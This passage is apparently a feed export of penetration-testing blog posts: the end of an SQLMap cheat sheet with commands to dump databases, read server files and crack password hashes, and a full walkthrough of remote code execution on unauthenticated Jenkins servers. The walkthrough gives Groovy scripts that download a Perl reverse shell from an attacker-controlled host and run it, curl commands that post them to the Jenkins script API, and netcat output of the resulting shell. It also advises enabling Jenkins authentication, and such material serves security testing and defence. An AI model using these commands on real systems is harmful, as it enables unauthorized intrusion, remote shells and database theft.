</tbody> \n </table> \n</div> \n<h2 id=\"sqlmap-examples\">SQLMap Examples</h2> \n<p>A mini SQLMap cheat sheet:</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>sqlmap -u http://meh.com --forms --batch --crawl=10 <br /> --cookie=jsessionid=54321 --level=5 --risk=3</code></p> </td> \n    <td> <p>Automated sqlmap scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code> sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE <br /> --level=3 --current-user --current-db --passwords <br /> --file-read=\"/var/www/blah.php\" </code></p> </td> \n    <td> <p>Targeted sqlmap scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>sqlmap -u \"http://meh.com/meh.php?id=1\" <br />--dbms=mysql --tech=U --random-agent --dump </code></p> </td> \n    <td> <p>Scan url for union + error based injection with mysql backend <br />and use a random user agent + database dump</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>sqlmap -o -u \"http://meh.com/form/\" --forms</code></p> </td> \n    <td> <p>sqlmap check form for injection</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>sqlmap -o -u \"http://meh/vuln-form\" --forms <br /> -D database-name -T users --dump</code></p> </td> \n    <td> <p>sqlmap dump and crack hashes for table users on database-name.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"text/html","publishedDate":"Fri, 17 Feb 2017 14:22:10 +0000","feedId":11390,"bgimg":"","linkMd5":"9025a67ce717df7a7bd2250fb2a3037b","bgimgJsdelivr":"","metaImg":"","author":"Arr0way","publishedOrCreatedDate":1598318675554},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Jenkins RCE via Unauthenticated API","link":"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/","description":"<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#description\" id=\"markdown-toc-description\">Description:</a></li> \n <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#tested-versions\" id=\"markdown-toc-tested-versions\">Tested Versions</a></li> \n <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#tested-operating-systems\" id=\"markdown-toc-tested-operating-systems\">Tested Operating Systems</a></li> \n <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#instructions\" id=\"markdown-toc-instructions\">Instructions</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#groovy-script-wget-shell\" id=\"markdown-toc-groovy-script-wget-shell\">groovy script wget shell</a></li> \n   <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#groovy-script-execute-shell-command\" id=\"markdown-toc-groovy-script-execute-shell-command\">groovy script execute shell command</a></li> \n   <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#execute-the-groovy-scripts-via-scripttext-jenkins-api\" id=\"markdown-toc-execute-the-groovy-scripts-via-scripttext-jenkins-api\">Execute the Groovy Scripts via scriptText Jenkins API</a></li> \n   <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#get-shell\" id=\"markdown-toc-get-shell\">Get Shell</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#more-info-about-jenkins\" id=\"markdown-toc-more-info-about-jenkins\">More info about Jenkins</a></li> \n <li><a href=\"https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/#more-resources\" id=\"markdown-toc-more-resources\">More Resources</a></li> \n</ul> \n<h2 id=\"description\">Description:</h2> \n<p><a href=\"https://jenkins-ci.org/\">Jenkins</a> (continuous intergration server) default install allows for unauthenticated access to the API on the Jenkins Master Server (default behavour). Allowing unauthenticated access to the groovy script console, allowing an attacker to execute shell commands and / or connect back with a reverse shell.</p> \n<div class=\"note warning\"> \n <h5>DISCLAIMER</h5> \n <p>Disclaimer, I didn't discover this exploit, it has been discovered before... This vulnerability has been disclosed before to the Jenkins CI developers, who do <b>not consider it a vulnerability</b>.</p> \n</div> \n<p><img src=\"https://i.imgur.com/lTas7UD.gif\" alt=\"Jenkins RCE API Exploit\" /></p> \n<h2 id=\"tested-versions\">Tested Versions</h2> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Software</th> \n    <th>Version</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>Jenkins</code></p> </td> \n    <td> <p>Ver 1.626</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>Jenkins</code></p> </td> \n    <td> <p>Ver 1.638</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"tested-operating-systems\">Tested Operating Systems</h2> \n<p>An effort to test all affected OS’s, showing the severity of the exploit (e.g. jenkins shell) for the default OS packaged version.</p> \n<div> \n <table> \n  <thead> \n   <tr> \n    <th>Operating System</th> \n    <th>Default Package Expoit</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>CentOS 6 - Jenkins RPM via Jenkins YUM Repo</code></p> </td> \n    <td> <p>shell as user jenkins</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"instructions\">Instructions</h2> \n<p>This is really basic, I made a few small groovy scripts to execute the shell commands I wanted via Jenkins API (I recall having some issues runing more than one command at a time via groovy), I then executed them using Curl.</p> \n<h3 id=\"groovy-script-wget-shell\">groovy script wget shell</h3> \n<p>Script to wget perl reverse shell to target and copy it to /tmp/shell.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">   <span class=\"n\">def</span> <span class=\"n\">command</span> <span class=\"o\">=</span> <span class=\"s\">\"wget http://192.168.145.128/perl-reverse-shell.pl -O /tmp/shell\"</span>\n   <span class=\"n\">def</span> <span class=\"n\">proc</span> <span class=\"o\">=</span> <span class=\"n\">command</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">()</span>\n   <span class=\"n\">proc</span><span class=\"o\">.</span><span class=\"na\">waitFor</span><span class=\"o\">()</span>\n\n   <span class=\"n\">println</span> <span class=\"s\">\"Process exit code: ${proc.exitValue()}\"</span>\n   <span class=\"n\">println</span> <span class=\"s\">\"Std Err: ${proc.err.text}\"</span>\n   <span class=\"n\">println</span> <span class=\"s\">\"Std Out: ${proc.in.text}\"</span></code></pre> \n</figure> \n<div class=\"note tip\"> \n <h5>Jenkins requires /tmp to have exec perms</h5> \n <p>By default Jenkins requires <code>/tmp</code> to have the execute mount option set, so you should be safe to land shells there on Jenkins servers.</p> \n</div> \n<h3 id=\"groovy-script-execute-shell-command\">groovy script execute shell command</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">    <span class=\"n\">def</span> <span class=\"n\">command</span> <span class=\"o\">=</span> <span class=\"s\">\"perl /tmp/shell\"</span>\n    <span class=\"n\">def</span> <span class=\"n\">proc</span> <span class=\"o\">=</span> <span class=\"n\">command</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">()</span>\n    <span class=\"n\">proc</span><span class=\"o\">.</span><span class=\"na\">waitFor</span><span class=\"o\">()</span>              \n\n    <span class=\"n\">println</span> <span class=\"s\">\"Process exit code: ${proc.exitValue()}\"</span>\n    <span class=\"n\">println</span> <span class=\"s\">\"Std Err: ${proc.err.text}\"</span>\n    <span class=\"n\">println</span> <span class=\"s\">\"Std Out: ${proc.in.text}\"</span></code></pre> \n</figure> \n<h3 id=\"execute-the-groovy-scripts-via-scripttext-jenkins-api\">Execute the Groovy Scripts via scriptText Jenkins API</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">curl <span class=\"nt\">-d</span> <span class=\"s2\">\"script=</span><span class=\"si\">$(</span>&lt;./wget.groovy<span class=\"si\">)</span><span class=\"s2\">\"</span> <span class=\"nt\">-X</span> POST http://192.168.30.130:8080/scriptText\ncurl <span class=\"nt\">--data-urlencode</span>  <span class=\"s2\">\"script=</span><span class=\"si\">$(</span>&lt;./execute.groovy<span class=\"si\">)</span><span class=\"s2\">\"</span> <span class=\"nt\">-X</span> POST http://192.168.30.130:8080/scriptText</code></pre> \n</figure> \n<h3 id=\"get-shell\">Get Shell</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">    <span class=\"o\">[</span>root:~/pwn-jenkins]# nc <span class=\"nt\">-v</span> <span class=\"nt\">-n</span> <span class=\"nt\">-l</span> <span class=\"nt\">-p</span> 443\n    listening on <span class=\"o\">[</span>any] 443 ...\n    connect to <span class=\"o\">[</span>192.168.30.128] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>192.168.30.130] 42340\n     21:16:17 up 15:17,  1 user,  load average: 0.23, 0.31, 0.17\n     USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\n     root     tty1     -                05:59    3:40   0.12s  0.12s <span class=\"nt\">-bash</span>\n     Linux localhost.localdomain 2.6.32-573.3.1.el6.x86_64 <span class=\"c\">#1 SMP Thu Aug 13 22:55:16 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>\n     <span class=\"nv\">uid</span><span class=\"o\">=</span>498<span class=\"o\">(</span>jenkins<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>499<span class=\"o\">(</span>jenkins<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>499<span class=\"o\">(</span>jenkins<span class=\"o\">)</span> <span class=\"nv\">context</span><span class=\"o\">=</span>unconfined_u:system_r:unconfined_java_t:s0\n     /\n     apache: cannot <span class=\"nb\">set </span>terminal process group <span class=\"o\">(</span><span class=\"nt\">-1</span><span class=\"o\">)</span>: Invalid argument\n     apache: no job control <span class=\"k\">in </span>this shell\n     apache-4.1<span class=\"nv\">$ </span><span class=\"nb\">whoami\n     whoami\n     </span>jenkins\n     apache-4.1<span class=\"nv\">$ </span><span class=\"nb\">id\n     id\n     </span><span class=\"nv\">uid</span><span class=\"o\">=</span>498<span class=\"o\">(</span>jenkins<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>499<span class=\"o\">(</span>jenkins<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>499<span class=\"o\">(</span>jenkins<span class=\"o\">)</span> <span class=\"nv\">context</span><span class=\"o\">=</span>unconfined_u:system_r:unconfined_java_t:s0\n     apache-4.1<span class=\"err\">$</span></code></pre> \n</figure> \n<div class=\"note info\"> \n <h5>Jenkins Does Not Consider this a Vulnerability</h5> \n <p>Dispite the fact the web application is insecure by default (the default install leaves the API and webapp exposed without authentication), Jenkins do not consider this a vulnerability. Your best option is to configure authentication by following the <a href=\"https://wiki.jenkins-ci.org/display/JENKINS/Standard+Security+Setup\">Securing Jenkinsi Guide</a></p> \n</div> \n<h2 id=\"more-info-about-jenkins\">More info about Jenkins</h2> \n<p>Jenkins is a tool consisting of a master and a slave, the master server schedules and runs jobs for the jenkins slaves to execute. The default installation configures the master as a slave server, allowing anyone with access to the Jenkins master to execute arbitrary code on the master (via the slave).</p> \n<p>A more secure solution would be isolating the role of the master server. Currently if a Jenkins master server is compromised, it’s likely an attacker will also be able to execute jobs / run shell scripts on the Jenkins slaves.</p> \n<p>An additional ACL option within Matrix-based security to disable API, and another for script console / execution on the Jenkins Master would be a good idea. Currently the only options is to disable all script access for the user/group, which appears to include the slaves.</p> \n<p>Be mindful of the fact that, by giving access to the slaves via the Jenkins Master, you’re essentially giving the user shell level access to the slave (or at least the ability to execute shell commands on the slave machine).</p> \n<h2 id=\"more-resources\">More Resources</h2> \n<p>More links about this vuln and similar Jenkins vulns below:</p> \n<ul> \n <li><a href=\"http://leonjza.github.io/blog/2015/05/26/jenkins-to-meterpreter-toying-with-powersploit/\">http://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console</a></li>
